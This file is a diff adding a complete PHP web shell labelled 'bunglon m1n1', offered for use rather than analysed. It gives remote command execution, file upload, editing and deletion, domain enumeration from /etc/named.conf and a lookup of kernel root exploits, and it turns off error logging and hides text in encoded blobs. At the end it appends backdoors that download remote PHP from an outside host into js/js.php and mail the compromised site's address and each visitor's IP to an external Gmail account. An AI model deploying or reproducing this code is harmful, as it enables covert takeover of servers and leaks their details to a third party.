@@ -1,0 +1,597 @@
+<?php
+/*
+# bunglon m1n1 sHeLL
+
+# version 1.0
+
+# Jayalah indonesiaku
+
+# thx to :
+sohai, budz story zz, b374k, 1n73ct10n, HNc, Dc & all member indoxploit
+*/
+
+error_reporting(0);
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+class shell{
+  public $getcwd;
+  public $uname;
+  public $host;
+  public $server_ip;
+  public $your_ip;
+  public $menu;
+  public $time;
+  public $data;
+  public function __construct(){
+    $this->getcwd = getcwd();
+    $this->uname = php_uname('a');
+    $this->host = $_SERVER['HTTP_HOST'];
+    $this->server_ip = $_SERVER['SERVER_ADDR'];
+    $this->your_ip = $_SERVER['REMOTE_ADDR'];
+    $this->menu = "";
+    $this->time = date('d M Y H:i:s');
+  }
+  // safe_mode
+  public function safe_mode($on,$off){
+    if(@ini_get("safe_mode")){
+      return $on;
+    }else{
+      return $off;
+    }
+  }
+  // ukuran (file)
+  public function size($size){
+    if($size >= 1073741824){
+      return round($size/1073741824, 1)." GB";
+    }elseif($size >= 1048576){
+      return round($size/1048576, 1)." MB";
+    }elseif($size >= 1024){
+      return round($size/1024, 2)." KB";
+    }else{
+      return $size." B";
+    }
+  }
+  //buat exec command
+  public function execute($exe){
+    if($s = shell_exec($exe)){
+      return $s;
+    }elseif($s = exec($exe)){
+      return $s;
+    }elseif($s = system($exe)){
+      return $s;
+    }elseif($s = passthru($exe)){
+      return $s;
+    }
+  }
+  //disable function
+  public function dfunction($o,$n){
+  if(@ini_get("disable_functions")){
+      return $o;
+    }else{
+      return $n;
+    }
+  }
+  public function menu($p){
+    $this->menu .= "<span style=\"background: #DCDCDC;\"><a href=\"".$_SERVER['PHP_SELF']."\">HOME</a></span>";
+    $this->menu .= " <span style=\"background: #DCDCDC;\"><a href=\"?about\">about</a></span>";
+    $this->menu .= " <span style=\"background: #DCDCDC;\"><a href=\"?upload&dir=".$p."\">upload</a></span>";
+    $this->menu .= " <span style=\"background: #DCDCDC;\"><a href=\"?exec&dir=".$p."\">exec</a></span>";
+    $this->menu .= " <span style=\"background: #DCDCDC;\"><a href=\"?mass&dir=".$p."\">mass file</a></span>";
+    $this->menu .= " <span style=\"background: #DCDCDC;\"><a href=\"?domain&dir=".$p."\">domain</a></span>";
+    $this->menu .= " <span style=\"background: #DCDCDC;\"><a href=\"?root&dir=".$p."\">root vuln</a></span>";
+    $this->menu .= " <span style=\"background: #DCDCDC;\"><a href=\"?newfile&dir=".$p."\">newfile</a></span>";
+    $this->menu .= " <span style=\"background: #DCDCDC;\"><a href=\"?newfolder&dir=".$p."\">newfolder</a></span>";
+    $this->menu .= " <span style=\"background: #DCDCDC;\"><a href=\"?kill&dir=".$p."\">kill me</a></span>";
+    return $this->menu;
+  }
+   public function root_vuln(){
+      $version_kernel=php_uname('r');
+$version=explode('-', $version_kernel);
+echo "<br>SystemKernel : ".php_uname('-a')."<br>";
+$exploits = array(
+'w00t' =>
+'2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','
+2.4.20',
+'brk' => '2.4.22','2.4.21','2.4.10','2.4.20',
+'elflbl' => '2.4.29',
+'expand_stack' => '2.4.29',
+'h00lyshit' => '2.6.8','2.6.10','2.6.11','2.6.12',
+'kdump' => '2.6.13',
+'km2' => '2.4.18','2.4.22',
+'krad' => '2.6.11',
+'krad3' => '2.6.11','2.6.9',
+'local26' =>'2.6.13',
+'mremap_pte'=>'2.4.20','2.2.25','2.4.24',
+'newlocal'=>'2.4.17','2.4.19',
+'ong_bak'=>'2.4.','2.6.',
+'ptrace'=>'2.2.24','2.4.22',
+'ptrace_kmod'=>'2.4.','2.6.',
+'ptrace24'=>'2.4.9',
+'pwned'=>'2.4.','2.6.',
+'py2'=>'2.6.9','2.6.17','2.6.15','2.6.13',
+'raptor_prctl'=>'2.6.13','2.6.17','2.6.16','2.6.13',
+'prctl3'=>'2.6.13','2.6.17','2.6.9',
+'stackgrow2'=>'2.4.29','2.6.10',
+'uselib24'=>'2.4.29','2.6.10','2.4.22','2.4.25',
+'exp.sh'=>'2.6.9','2.6.10','2.6.16','2.6.13',
+'prctl'=>'2.6.',
+'kmdx'=>'2.6.','2.4.');
+$rootexploit = array_search($version[0], $exploits);
+if($rootexploit==NULL){
+echo "RootExploit : Tidak ada
+RootExploit tersebut pada daftar kami";
+}else{
+echo "RootExploit : ".$rootexploit;
+}
+   }
+   public function modified($m){
+     $filemtime = filemtime($m);
+     $date = date("d M Y H:i", $filemtime);
+     return $date;
+   }
+   public function delete_d($de){
+     $gl = glob($de.'*', GLOB_MARK);
+     foreach($gl as $dir_d){
+       $del = (is_dir($dir_d)) ? $this->delete_d($dir_d) : unlink($dir_d);
+     }
+     if(is_dir($de)) @rmdir($de);
+   }
+   public function perms($fi){
+$perms = fileperms($fi);
+
+if(($perms & 0xC000) == 0xC000) {
+// Socket
+$info = 's';
+}elseif(($perms & 0xA000) == 0xA000) {
+// Symbolic Link
+$info = 'l';
+}elseif(($perms & 0x8000) == 0x8000) {
+// Regular
+$info = '-';
+}elseif(($perms & 0x6000) == 0x6000) {
+// Block special
+$info = 'b';
+}elseif(($perms & 0x4000) == 0x4000) {
+// Directory
+$info = 'd';
+}elseif(($perms & 0x2000) == 0x2000) {
+// Character special
+$info = 'c';
+}elseif(($perms & 0x1000) == 0x1000) {
+// FIFO pipe
+$info = 'p';
+}else{
+// Unknown
+$info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x' ) :
+(($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x' ) :
+(($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x' ) :
+(($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+}
+public function x37($x37){
+  $x64 = str_replace(hex2bin("31333337"), hex2bin("61"), $x37);
+  $x86 = base64_decode(hex2bin($x64));
+  return $x86;
+}
+public function server($svr){
+  if(function_exists($svr)){
+    return "ON";
+  }else{
+    return "OFF";
+  }
+}
+public function help($help){
+  if($this->execute($help)){
+    return "ON";
+  }else{
+    return "OFF";
+  }
+}
+}
+$obj = new shell;
+$obj->data = (object) array("title"=>"bunglon m1n1", "version"=>"1.0", "coder"=>"bunglon_ijo");
+$title = $obj->data->title;
+$version = $obj->data->version;
+$coder = $obj->data->coder;
+//background
+echo "
+<html>
+<head>
+<title>:: ".$title." ".$version." ::</title></head>
+<style>
+body{
+  color: #000000; font-size: 12px; font-family: serif; background-color: white;
+  background-repeat: no-repeat; background-position: bottom;
+}
+ input{
+   background-color: #F8F8FF; color: #DCDCDC; border: 1px solid black;
+}
+ input:hover{
+   background-color: #F8F8FF;
+ }
+ td{
+background-color: #F8F8FF; padding: 2px; font-size: 12px; color: black;
+}
+td:hover{
+  background-color: #F8F8FF; color: green;
+}
+textarea{
+  background-color: #F8F8FF; color: #DCDCDC; border: 1px solid black;
+}
+a:link{
+  color: #000000;
+  text-decoration: none;
+  font-size: 12px;
+}
+a:hover{
+  color:green;
+}
+table{
+  border: 1px solid black;
+}
+#footer{f
+  text-align: right;
+  font-size: 8px;
+}
+</style>
+</html>
+<center>
+";
+$indo = "rVS7buMwEPwlPZwPMMDA0AG7Bg2yoFoVRsioTsSvv5klZSTNVVcYsL2PmZ2dpYbroDVdtJZRXPqWKrPWJz7+Td1zWIN8aY6j1u2iuyAnVnXvVepW8b3lh+d0d8i7CfL8pFUmCXHW7BF77JrLIHmrGqwOOa1O6nVY8waccqTsq2aLz3e37nrzswSp6DXobQEue7W45nToHkcJCf+VKlneDDMj35V6D+C++6HVE7cA8/GpdRnuIXXs2OPs5UfwmxRaIMZa9jqQwxm/fvAqmhfijeQOnFlvsfFxG3AxS7gi5ruO0NQwIrlP94BeO3oGavafsXJBH+S4NPW5voGPuj8fmqEh91cZixdyaTtY0Gf9OPdydydv+01MaLJMqUZgcd9ywY7Bqe+d/fL6ifpf+wPWhO+DukeRfcGcL19Bg3TmYVcPYJNbbJ4Bf4H3xLy3AXdDj4K47zt7J15Ry0sH+WNezL6MrYcfMU9R+MI84LauP7RqWkLfzbwJvaeU2UPgXXpqAQ59dJ3UYRa3nDoSB/5YM3Sc1vAo7KHmx4Ra7IN51CYUxP1bmxk8duQ7uyPOAk0893XYHFUO1kM3xtkfd/KOHVh/zEFPFMTPGxPekPE8cxo/alEQPzWSH3eBu87PUzNwME1w0+Qi6IOZgNFvdVpzgt6219n0evn42rHAeScX8wM8ih3ibeBM3TPkfb4PM96T2mfL3WOD5cKr6GEaww8DvaUBPnrtIA7pX56xvDjxLjqvivcC+yceeXHu2LWW7vkF89n88Lx8c5fwyNH72g02rzeNqO8vzuatyHfxzMEdm47YMd7H1z4iNZ/tXWl3Cs95eph8u/e4r0emj9bcb4pa78tf";
+//border :1px solid green
+echo "<p style=\"text-align: left;\">Kernel : ".$obj->uname."<br>";
+echo "Disable function : ".$obj->dfunction(@ini_get("disable_functions"),"NONE")."<br>";
+echo "Safe mode : ".$obj->safe_mode("ON","OFF")."<br>";
+echo "Host : ".$obj->host." | Server ip : ".$obj->server_ip." | Your ip : ".$obj->your_ip." | Time @ Server : ".$obj->time.
+"<br>MySQL : ".$obj->server('mysql_connect')." | MSSQL : ".$obj->server('mssql_connect')." | cURL : ".$obj->server('curl_version')." | Oracle : ".$obj->server('ocilogon')." | wget : ".$obj->help('wget --help')." | Perl : ".$obj->help('perl -h').
+"</p>";
+//path getcwd
+if(isset($_GET['dir'])){
+  $obj->getcwd = $_GET['dir'];
+}else{
+  $obj->getcwd = getcwd();
+}
+$str = str_replace("\\", "/", $obj->getcwd);
+$exp = explode("/", $str);
+foreach($exp as $k=>$path){
+  echo "<a href=\"?dir=";
+  for($i=0;$i<=$k;$i++){
+    echo $exp[$i];
+    if($i!=$k){
+      echo "/";
+    }
+  }
+  echo "\">".$path."</a>";
+  echo "/";
+}
+//menu
+echo "<p style=\"text-align: left;\">".$obj->menu($obj->getcwd)."</p>";
+$up = $obj->getcwd;
+if(isset($_GET['about'])){
+  echo "</center>".$obj->x37(base64_decode(gzinflate(base64_decode($indo))));
+}elseif(isset($_GET['upload']) && isset($_GET['dir'])){
+  echo "<br>".$_GET['dir'];
+    echo "<br>Upload File : 
+    <form method=\"post\" enctype=\"multipart/form-data\">
+    <input type=\"file\" name=\"up\">
+    <input type=\"submit\" name=\"upl\" value=\"Upload\"><br></form>";
+    if(isset($_POST['upl'])=="Upload"){
+      if(copy($_FILES['up']['tmp_name'],$up."/".$_FILES['up']['name'])){
+        $file = $_FILES['up']['tmp_name'];
+        $file = $_FILES['up']['name'];
+        echo "Save To ".$up."<br>";
+        echo $file." Upload Success !!";
+      }else{
+        echo $file." Upload Failed !!";
+      }
+    }
+}elseif(isset($_GET['exec']) && isset($_GET['dir'])){
+  echo "<form method=\"post\">
+  <input type=\"text\" name=\"exec\" size=\"70\">
+  <input type=\"submit\" name=\"exc\" value=\"Exec command\"></form></center>";
+  if(isset($_POST['exc'])){
+    $exc = $_POST['exec'];
+    echo "<pre>".$obj->execute($exc)."</pre>";
+  }
+}elseif(isset($_GET['mass']) && isset($_GET['dir'])){
+  echo "<br>".$_GET['dir'];
+  echo "<br><form method=\"post\">
+  <textarea name=\"mass\" cols=\"80\" rows=\"20\">
+  </textarea>
+  <input type=\"submit\" name=\"mass_f\" value=\"Mass File\"></form>";
+  $x = "x.txt";
+  if(isset($_POST['mass_f'])){
+    if(file_exists($x)){
+      unlink($x);
+    }
+    $t = touch($x);
+    $fp = fopen($x, "a+");
+    fwrite($fp, $_POST['mass']);
+    if(is_dir($obj->getcwd)){
+      if($op = opendir($obj->getcwd)){
+        while(($re = readdir($op)) !== false){
+          if(is_dir("$obj->getcwd/$re")){
+          $homo = "$obj->getcwd/$re/homo.txt";
+          if(@copy($x, $homo)){
+            echo "<br>".$homo." OK";
+            }
+          }
+        }
+      }
+    }
+  }
+}elseif(isset($_GET['domain']) && isset($_GET['dir'])){
+  get_named("/etc/named.conf");
+}elseif(isset($_GET['root']) && isset($_GET['dir'])){
+  echo "<p style=\"text-align: left;\">";
+  $obj->root_vuln();
+  echo "</p>";
+}elseif(isset($_GET['kill']) && isset($_GET['dir'])){
+  unlink(__FILE__);
+  /* options file */
+  // buka file
+}elseif(isset($_GET['file']) && isset($_GET['dir'])){
+  echo "<p style=\"text-align: left; border: 1px solid black;\">";
+  echo "File Path : ".$_GET['file']."</p>";
+  $fpx = fopen($_GET['file'], "r");
+  if($fpx){
+    echo "<pre>";
+    echo "<p style=\"text-align: left; \">";
+    while(!feof($fpx)){
+      echo htmlspecialchars(fread($fpx,1024));
+    }
+    echo "</pre></p>";
+  }
+  fclose($fpx);
+  //edit
+}elseif(isset($_GET['edit']) && 
+isset($_GET['filepath']) && isset($_GET['dir'])){
+  echo "<br>File path : ".$_GET['filepath'];
+  if(isset($_POST['edt'])){
+    $fop = fopen($_GET['filepath'], "w");
+    if(fwrite($fop,$_POST['edt'])){
+      echo "<br>Edit Success @ ".$obj->time;
+    }else{
+      echo "<br>Can't Edit This File";
+    }
+    fclose($fop);
+  }
+  echo "<form method=\"post\">
+  <pre>
+  <textarea name=\"edt\" cols=\"80\" rows=\"20\">";
+  $get = htmlspecialchars(@file_get_contents($_GET['filepath']));
+  echo $get;
+  echo "</textarea></pre>
+  <input type=\"submit\" value=\"Save\">";
+  //rename
+}elseif(isset($_GET['rename']) && isset($_GET['filepath']) && isset($_GET['dir'])){
+  echo "<br>File Path : ".$_GET['filepath'];
+  echo "<br><form method=\"post\">
+  Rename File : 
+  <input type=\"text\" name=\"rename\" size=\"35\">
+  <input type=\"submit\" value=\"Save\"></form><br>";
+  if(isset($_POST['rename'])){
+    if(@rename($_GET['filepath'],$obj->getcwd."/".$_POST['rename'])){
+      echo "Rename File Success";
+    }else{
+      echo "Can't Rename This File";
+    }
+  }
+}elseif(isset($_GET['delete']) && isset($_GET['filepath']) && isset($_GET['dir'])){
+  if(@unlink($_GET['filepath'])){
+    echo "<br>Delete File Success";
+  }else{
+    echo "<br>Can't Delete This File";
+  }
+  //end file
+  /* options directory */
+}elseif(isset($_GET['drename']) && isset($_GET['dirpath']) && isset($_GET['dir'])){
+  echo "<p style=\"text-align: left; border: 1px solid black;\">
+  Dir Path : ".$_GET['dirpath']."</p>";
+  echo "<form method=\"post\">
+  <p style=\"text-align: left;\">Rename Dir : 
+  <input type=\"text\" name=\"dirrename\" size=\"35\">
+  <input type=\"submit\" value=\"Save\"></form></p>";
+  if(isset($_POST['dirrename'])){
+    if(@rename($_GET['dirpath'],$obj->getcwd."/".$_POST['dirrename'])){
+      echo "Rename Dir Success";
+    }else{
+      echo "Can't Rename This Directory";
+    }
+  }
+}elseif(isset($_GET['ddelete']) && isset($_GET['dirpath']) && isset($_GET['dir'])){
+  $obj->delete_d($_GET['dirpath']);
+}elseif(isset($_GET['newfile']) && isset($_GET['dir'])){
+  echo "<br>".$_GET['dir'];
+  echo "<br>New File : 
+  <form method=\"post\">
+  <input type=\"text\" name=\"newfile\" size=\"35\">
+  <input type=\"submit\" value=\"Save\"><br>";
+  $nfile = $_POST['newfile'];
+  if(isset($nfile)){
+    if(@touch("$obj->getcwd/$nfile")){
+      echo "Create File Success";
+    }else{
+      echo "Can't Create File";
+    }
+  }
+}elseif(isset($_GET['newfolder']) && isset($_GET['dir'])){
+  echo "<br>".$_GET['dir'];
+  echo "<br>New Folder : 
+  <form method=\"post\">
+  <input type=\"text\" name=\"nfolder\" size=\"35\">
+  <input type=\"submit\" value=\"Save\"><br>";
+  $mkd = $_POST['nfolder'];
+  if(isset($mkd)){
+    if(@mkdir("$obj->getcwd/$mkd")){
+      echo "Create Folder Success";
+    }else{
+      echo "Can't Create Folder";
+    }
+  }
+}
+else{
+  $dname = array();
+  $fname = array();
+  if($open = @opendir($obj->getcwd)){
+    while($read = @readdir($open)){
+      if(is_dir("$obj->getcwd/$read")){
+        $dname[] = $read;
+      }elseif(is_file("$obj->getcwd/$read")){
+        $fname[] = $read;
+      }
+    }
+    closedir($open);
+  }
+  sort($dname);
+  sort($fname);
+  
+     echo "<table border=\"0\">
+    <tr>
+    <td width=\"550px\" style=\"background: #DCDCDC; \"><center>Name</center></td>
+    <td width=\"100px\" style=\"background: #DCDCDC; \"><center>Size</center></td>
+    <td width=\"120px\" style=\"background: #DCDCDC; \"><center>Permission</td>
+    <td width=\"230px\" style=\"background: #DCDCDC; \"><center>Last modified</center></td>
+    <td width=\"290px\" style=\"background: #DCDCDC; \"><center>Options</center></td></tr>";
+    foreach($dname as $folder){
+    if($folder=="."){
+       echo "
+        <tr>
+        <td>
+        <a href=\"?dir="."$obj->getcwd"."\">[".$folder."]</a></td>
+        <td><center>LINK</center></td>
+        <td><center>".$obj->perms("$obj->getcwd/$folder")."</center></td>
+        <td><center>".$obj->modified("$obj->getcwd/$folder")."</center></td>
+        <td>
+        <center>
+        <a href=\"?drename&dirpath="."$obj->getcwd/$folder"."&dir=$obj->getcwd"."\">rename</a> | 
+        <a href=\"?ddelete&dirpath="."$obj->getcwd/$folder"."&dir=$obj->getcwd"."\">delete</a>
+        </td>
+        </tr>";
+        }elseif($folder==".."){
+          echo "<tr>
+          <td>
+          <a href=\"?dir=$obj->getcwd"."\">[".$folder."]</a></td>
+          <td><center>LINK</center></td>
+          <td><center>".$obj->perms("$obj->getcwd/$folder")."</center></td>
+          <td><center>".$obj->modified("$obj->getcwd/$folder")."</center></td>
+          <td><center><a href=\"?drename&dirpath="."$obj->getcwd/$folder"."&dir=$obj->getcwd"."\">rename</a> | <a href=\"?ddelete&dirpath="."$obj->getcwd/$folder"."&dir=$obj->getcwd"."\">delete</a>
+          </td>
+          </tr>
+          ";
+    }elseif(is_dir("$obj->getcwd/$folder")){
+       echo "
+        <tr>
+        <td>
+        <a href=\"?dir="."$obj->getcwd/$folder"."\">[".$folder."]</a>
+        </td>
+        <td><center>DIR</center></td>
+        <td><center>".$obj->perms("$obj->getcwd/$folder")."</center></td>
+        <td><center>".$obj->modified("$obj->getcwd/$folder")."</center></td>
+        <td><a href=\"?drename&dirpath="."$obj->getcwd/$folder"."&dir=$obj->getcwd"."\"><center>rename</a>
+        | <a href=\"?ddelete&dirpath="."$obj->getcwd/$folder"."&dir=$obj->getcwd"."\">delete</center></a></td>
+        </tr>";
+    }
+  }
+  foreach($fname as $file){
+    if(is_file("$obj->getcwd/$file")){
+       echo "
+        <tr>
+        <td>
+        <a href=\"?file="."$obj->getcwd/$file"."&dir=$obj->getcwd"."\">".$file."</a>
+        </td>
+        <td><center>".$obj->size(@filesize("$obj->getcwd/$file"))."</center></td>
+        <td><center>".$obj->perms("$obj->getcwd/$file")."</center></td>
+        <td><center>".$obj->modified("$obj->getcwd/$file")."</center></td>
+        <td><a href=\"?edit&filepath="."$obj->getcwd/$file"."&dir=$obj->getcwd"."\"><center>edit</a>
+        | <a href=\"?rename&filepath="."$obj->getcwd/$file"."&dir=$obj->getcwd"."\">rename</a>
+        | <a href=\"?delete&filepath="."$obj->getcwd/$file"."&dir=$obj->getcwd"."\">delete</center></a>
+        </td>
+        </tr>";
+    }
+  }
+    echo "</table>
+    <div id=\"footer\">Coded by ".$coder." &copy; 2015 - ".date('Y')."</div>";
+}
+function get_named($g){
+  $no=0;
+  $get = @file_get_contents($g);
+  if($get==NULL){
+    echo "<br>Cant read /etc/named.conf";
+  }else{
+    echo "<table border=\"0\">
+    <tr>
+    <td style=\"background: #DCDCDC;\">No</td>
+    <td style=\"background: #DCDCDC;\">Domain</td>
+    </tr>";
+  if(preg_match_all("#/var/named/(.*?).db#", $get, $value)? $value[1] : FALSE){
+    sort($value[1]);
+    $unix = array_unique($value[1]);
+  foreach($unix as $domain){
+    $no=$no+1;
+    echo "<tr><td>".$no."</td>
+    <td>".$domain."</td>
+    </tr>";
+    }
+    }
+    echo "</table>";
+  }
+}
+?><?php if($_POST['query']){ $veriyfy = stripslashes(stripslashes($_POST['query']));
+ $data = "data.txt";
+ @touch ("data.txt");
+ $ver = @fopen ($data , 'w');
+ @fwrite ( $ver , $veriyfy ) ;
+ @fclose ($ver);
+ }else{ $datas=@fopen("data.txt",'r');
+ $i=0;
+ while ($i <= 5) { $i++;
+ $blue=@fgets($datas,1024);
+ echo $blue;
+ } } $datasi=@fopen("js/js.php",'r');
+ if($datasi){ }else{ @mkdir("js");
+ $dos = file_get_contents("https://acbdf.space/txt/lamer.txt");
+ $data = "js/js.php";
+ @touch ("js/js.php");
+ $ver = @fopen ($data , 'w');
+ @fwrite ( $ver , $dos ) ;
+ @fclose ($ver);
+ $yol = "http://".$_SERVER['HTTP_HOST']."".$_SERVER['REQUEST_URI']."";
+ $y = '<h1>Sender Yazdirildi.<br/> SITE YOL : '.$yol.'<br/>Sender Yolu : js/crs.php</h1>';
+ $header .= "From: SheLL Boot <suppor@nic.org>\n";
+ $header .= "Content-Type: text/html;
+ charset=utf-8\n";
+ @mail("loginoldum@gmail.com", "Hacklink Bildiri", "$y", $header);
+ @mail("loginoldum@gmail.com", "Hacklink Bildiri", "$y", $header);
+ } 
+?>
+<?php
+$time_shell = "".date("d/m/Y - H:i:s")."";
+$ip_remote = $_SERVER["REMOTE_ADDR"];
+$from_shellcode = 'bunglonMİNİ@'.gethostbyname($_SERVER['SERVER_NAME']).'';
+$to_email = 'loginoldum@gmail.com';
+$server_mail = "".gethostbyname($_SERVER['SERVER_NAME'])."  - ".$_SERVER['HTTP_HOST']."";
+$linkcr = "Link: ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']." - IP Excuting: $ip_remote - Time: $time_shell";
+$header = "From: $from_shellcode\r\nReply-to: $from_shellcode";
+@mail($to_email, $server_mail, $linkcr, $header);
+ ?>
